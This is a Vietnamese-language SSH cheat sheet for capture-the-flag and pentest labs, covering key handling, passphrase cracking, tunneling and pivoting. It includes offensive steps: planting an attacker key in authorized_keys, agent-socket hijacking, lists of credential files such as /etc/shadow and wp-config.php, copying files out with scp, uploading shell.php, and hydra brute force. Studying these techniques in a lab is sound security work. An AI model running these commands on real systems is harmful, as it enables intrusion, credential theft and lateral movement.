## 📡 Kết nối cơ bản

```bash
ssh user@host                          # Kết nối cơ bản
ssh user@host -p 2222                  # Custom port
ssh user@host -i id_rsa                # Dùng private key
ssh user@host -i id_rsa -p 2222        # Key + custom port
ssh -v user@host                       # Verbose (debug L1)
ssh -vvv user@host                     # Verbose max (debug L3)
ssh user@host -o StrictHostKeyChecking=no   # Bỏ qua host key check (CTF)
ssh user@host -o PasswordAuthentication=no # Chỉ dùng key
```

---

## 🔑 SSH Keys

### Tạo key pair

```bash
ssh-keygen -t rsa -b 4096 -f ./id_rsa              # RSA 4096-bit
ssh-keygen -t ed25519 -f ./id_ed25519              # Ed25519 (khuyên dùng)
ssh-keygen -t rsa -b 4096 -C "user@host"           # Với comment
ssh-keygen -f id_rsa -p                            # Đổi passphrase
```

### Fix quyền key (BẮT BUỘC)

```bash
chmod 600 id_rsa
chmod 644 id_rsa.pub
```

### Authorized keys

```bash
# Thêm public key vào target (nếu có write access)
echo "ssh-rsa AAAA... attacker@kali" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

### Copy key lên server

```bash
ssh-copy-id -i ~/.ssh/id_rsa.pub user@host
ssh-copy-id -i ~/.ssh/id_rsa.pub -p 2222 user@host
```

---

## 🔓 Crack SSH Private Key (CTF hay gặp)

```bash
# Nếu id_rsa có passphrase → crack bằng John
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Hoặc dùng hashcat (mode 22921)
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt
```
### Xử lý trường private key không hợp lệ
#### 1. Công cụ chính: ssh-keygen (đã có sẵn trong Kali)

Đây là công cụ mạnh nhất và phổ biến nhất để kiểm tra và sửa private key.

**Các lệnh hữu ích:**

Bash

```
# Kiểm tra private key có hợp lệ không
ssh-keygen -y -f /path/to/id_rsa

# Nếu key bị lỗi format, thử convert sang định dạng OpenSSH chuẩn
ssh-keygen -p -f /path/to/id_rsa -m openssh

# Hoặc convert từ PEM sang OpenSSH
ssh-keygen -f /path/to/key.pem -i -m pem > /path/to/id_rsa
```

#### 2. Công cụ khác: puttygen (rất tốt để sửa key)

Bash

```
sudo apt update && sudo apt install putty-tools -y
```

**Sử dụng puttygen để convert/fix key:**

Bash

```
# Convert key sang định dạng OpenSSH
puttygen /path/to/your_key -O private-openssh -o /path/to/id_rsa_fixed

# Sau đó set quyền
chmod 600 /path/to/id_rsa_fixed
```
---

## 🛡️ SSH Tunneling & Port Forwarding

### Local Port Forwarding (L)

```bash
# Truy cập dịch vụ nội bộ của target qua local port
ssh -L 8080:127.0.0.1:80 user@host         # localhost:8080 → target:80
ssh -L 1433:10.10.10.5:1433 user@pivot     # SQL Server qua pivot
ssh -N -L 8080:127.0.0.1:80 user@host      # -N: không mở shell
```

### Remote Port Forwarding (R)

```bash
# Expose dịch vụ local ra ngoài qua SSH server
ssh -R 9090:127.0.0.1:9090 user@attackerVPS
ssh -R 4444:127.0.0.1:4444 user@host       # Expose reverse shell
```

### Dynamic Port Forwarding (SOCKS Proxy)

```bash
ssh -D 1080 user@host                      # SOCKS5 proxy trên port 1080
ssh -N -D 9050 user@host                   # Dùng với proxychains

# /etc/proxychains4.conf:
# socks5 127.0.0.1 1080
proxychains nmap -sV 10.10.10.x
proxychains curl http://internal.site
```

### Double Pivot / Jump Host

```bash
ssh -J user1@host1 user2@host2             # Jump qua host1 để đến host2
ssh -J user1@host1:22 user2@192.168.1.5   # ProxyJump
# Hoặc cấu hình trong ~/.ssh/config:
# Host target
#   ProxyJump pivot
```

---

## 🔁 SSH Agent & Forwarding

```bash
eval $(ssh-agent)                          # Start SSH agent
ssh-add id_rsa                             # Thêm key vào agent
ssh-add -l                                 # Liệt kê key trong agent
ssh -A user@host                           # Forward agent (pivot attacks)

# Agent Hijacking (sau khi có shell)
ls /tmp/ssh-*/                             # Tìm agent socket
export SSH_AUTH_SOCK=/tmp/ssh-xxx/agent.xxx
ssh-add -l                                 # Dùng key của victim
ssh user@nexthost                          # Pivot với key của họ
```

---

## 🧲 SSH Escape Sequences (trong session)

```
~.     # Ngắt kết nối
~C     # Mở SSH command line (thêm port forward realtime)
~#     # Liệt kê forwarded connections
~?     # Xem tất cả escape sequences
```

---

## 📁 Các File Giá Trị Cao — Khi Enumerate Target

### 🔑 SSH & Credentials

|File|Mô tả|
|---|---|
|`~/.ssh/id_rsa`|Private key RSA (jackpot!)|
|`~/.ssh/id_ed25519`|Private key Ed25519|
|`~/.ssh/id_dsa`|Private key DSA (cũ, yếu)|
|`~/.ssh/authorized_keys`|Keys được phép login|
|`~/.ssh/known_hosts`|Hosts đã kết nối → gợi ý pivot|
|`~/.ssh/config`|Config SSH → thấy user/host nội bộ|
|`/etc/ssh/sshd_config`|Config SSH server (xem `PermitRootLogin`, `PasswordAuthentication`)|
|`/etc/ssh/ssh_host_*_key`|Host private keys (cần root)|

### 👤 User & Auth

|File|Mô tả|
|---|---|
|`/etc/passwd`|Danh sách user, home dir, shell|
|`/etc/shadow`|Password hash (cần root)|
|`/etc/sudoers`|Quyền sudo|
|`/etc/sudoers.d/*`|Sudo rules bổ sung|
|`~/.bash_history`|Lịch sử lệnh → credentials, paths|
|`~/.zsh_history`|Tương tự bash_history|
|`~/.mysql_history`|Queries MySQL đã chạy|
|`~/.psql_history`|Queries PostgreSQL|
|`~/.python_history`|Lịch sử Python interactive|
|`/root/.bash_history`|Root history (nếu đọc được → cực giá trị)|

### ⚙️ Config & Credentials

|File|Mô tả|
|---|---|
|`/etc/hosts`|Hostname nội bộ → enumerate thêm|
|`/etc/hostname`|Tên máy|
|`/etc/crontab`|Cron jobs system|
|`/var/spool/cron/crontabs/*`|Cron jobs theo user|
|`/etc/cron.d/*`|Cron jobs bổ sung|
|`/proc/sched_debug`|Processes đang chạy|
|`/proc/net/tcp`|Kết nối TCP nội bộ|
|`/proc/net/tcp6`|Kết nối TCP IPv6|
|`/proc/self/environ`|Biến môi trường process hiện tại|

### 🌐 Web & Database

|File|Mô tả|
|---|---|
|`/var/www/html/`|Web root mặc định|
|`/var/www/html/config.php`|DB credentials của PHP app|
|`/var/www/html/.env`|Laravel/Django env vars|
|`/var/www/html/wp-config.php`|WordPress DB credentials|
|`/var/www/html/configuration.php`|Joomla credentials|
|`~/.env`|Dotenv files|
|`/opt/app/config.yml`|App config|
|`/etc/apache2/sites-enabled/*`|VirtualHosts Apache|
|`/etc/nginx/sites-enabled/*`|VirtualHosts Nginx|

### 🗝️ Database Credentials

|File|Mô tả|
|---|---|
|`/etc/mysql/my.cnf`|MySQL config|
|`~/.my.cnf`|MySQL credentials lưu sẵn|
|`/var/lib/mysql/`|Data MySQL|
|`/etc/postgresql/*/main/pg_hba.conf`|Auth PostgreSQL|
|`/var/lib/pgsql/data/pg_hba.conf`|Auth PostgreSQL alt|

### 🔓 Privilege Escalation Hints

|File|Mô tả|
|---|---|
|`/etc/passwd`|Xem shell `/bin/bash` hay `/bin/false`|
|`/usr/local/bin/*`|Binaries tự cài → có thể SUID|
|`/opt/`|Apps bên thứ ba → hay có vuln|
|`/tmp/`|Scripts tạm, reverse shells|
|`/var/backups/`|Backup có thể chứa credentials|
|`/var/log/auth.log`|Lịch sử auth → brute force detection|
|`/var/log/syslog`|System log|
|`/var/log/apache2/access.log`|Web access log|
|`/proc/version`|Kernel version → kernel exploit|
|`/etc/os-release`|OS version|
|`/etc/issue`|Banner + OS info|

### 🏆 Flag Locations (CTF)

|Path|Mô tả|
|---|---|
|`~/user.txt`|User flag (HTB/THM)|
|`/root/root.txt`|Root flag|
|`/home/*/user.txt`|User flag trong home dirs|
|`/home/*/Desktop/user.txt`|Flag trên Desktop (Windows-style)|
|`C:\Users\*\Desktop\user.txt`|Windows user flag|
|`C:\Users\Administrator\Desktop\root.txt`|Windows root flag|

---

## ⚡ One-liners Hay Dùng

```bash
# Tìm tất cả file SSH keys trên hệ thống
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Tìm file SUID (priv esc)
find / -perm -4000 -type f 2>/dev/null

# Tìm file writable bởi current user
find / -writable -type f 2>/dev/null | grep -v proc

# Tìm file có chứa "password"
grep -r "password" /var/www/ 2>/dev/null
grep -ri "passwd\|password\|secret\|credential" /opt/ 2>/dev/null

# Xem crontab của mọi user
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done

# Liệt kê tất cả user có shell thật
grep -v '/nologin\|/false' /etc/passwd

# Xem port đang listen nội bộ
ss -tlnp
netstat -tlnp 2>/dev/null
cat /proc/net/tcp
```

---

## 🧰 ProxyChains + SSH Pivot

```bash
# 1. Tạo SOCKS proxy
ssh -N -D 9050 user@pivot_host

# 2. Config proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf

# 3. Scan qua pivot
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.5 -u Administrator -p 'Password123'
proxychains impacket-psexec domain/user:pass@10.10.10.5
```

---

## 📋 SSH Config File (`~/.ssh/config`)

```
# Dùng để quản lý nhiều target trong CTF/lab
Host htb-target
    HostName 10.10.10.x
    User john
    IdentityFile ~/.ssh/id_rsa
    Port 22

Host pivot
    HostName 10.10.10.y
    User www-data
    IdentityFile ~/.ssh/id_rsa_pivot

Host internal
    HostName 192.168.1.5
    User administrator
    ProxyJump pivot
    IdentityFile ~/.ssh/id_rsa_internal
```

```bash
# Sau khi config → dùng gọn
ssh htb-target
ssh internal    # Tự động pivot qua 'pivot' host
```

---

## 🛠️ Misc Tools Liên Quan

```bash
# SCP - Copy file qua SSH
scp user@host:/etc/passwd ./passwd_copy
scp -i id_rsa user@host:/root/root.txt ./root.txt
scp -r user@host:/var/www/html ./html_backup

# SFTP - Duyệt file interactive
sftp -i id_rsa user@host
sftp> ls -la
sftp> get /root/root.txt
sftp> put shell.php /var/www/html/shell.php

# Rsync qua SSH
rsync -avz -e "ssh -i id_rsa" user@host:/opt/app ./app_backup

# SSH với PTY (reverse shell upgrade)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Sau đó: Ctrl+Z → stty raw -echo; fg → Enter Enter
```

---

## 🔍 Enumeration SSH Nhanh

```bash
# Nmap SSH fingerprint
nmap -p22 -sV --script=ssh-auth-methods,ssh-hostkey,ssh2-enum-algos target

# Kiểm tra auth methods
ssh -v user@host 2>&1 | grep "Authentications that can continue"

# Hydra brute force SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://host
hydra -L users.txt -P passwords.txt ssh://host -t 4

# Medusa
medusa -h host -u user -P rockyou.txt -M ssh

# Metasploit
use auxiliary/scanner/ssh/ssh_login
```

---

> **Tips từ IppSec:** Luôn check `~/.bash_history`, `~/.ssh/`, `/opt/`, và `/var/www/` ngay khi có shell. Sau đó chạy `sudo -l` và tìm SUID. 80% box HTB giải được từ đây.

---

_Cheat sheet tổng hợp từ: SSH man pages, IppSec writeups, HackTheBox, TryHackMe, GTFOBins_